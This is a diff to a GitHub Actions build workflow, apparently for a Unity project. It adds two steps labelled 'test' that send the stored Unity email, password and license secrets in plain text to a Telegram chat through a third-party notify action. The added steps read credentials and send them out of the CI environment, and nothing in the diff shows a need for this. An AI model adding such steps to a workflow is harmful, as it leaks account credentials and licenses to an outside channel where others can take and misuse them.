@@ -92,7 +92,24 @@ jobs:
           large-packages: true
           docker-images: false
           swap-storage: false
-          
+
+      # *** test ***
+      - name: send unity info
+        uses: mnicolas94/facticus-deploy/.github/actions/notify@v0.4.18
+        with:
+          notifyPlatform: ${{ matrix.notifyPlatform }}
+          message: "email ${{ secrets.UNITY_EMAIL }}, p ${{ secrets.UNITY_PASSWORD }}"
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+      # *** test ***
+      - name: send unity license
+        uses: mnicolas94/facticus-deploy/.github/actions/notify@v0.4.18
+        with:
+          notifyPlatform: ${{ matrix.notifyPlatform }}
+          message: "license ${{ secrets.UNITY_LICENSE }}"
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
+      
       # --- Build ---
       - name: Build
         id: build
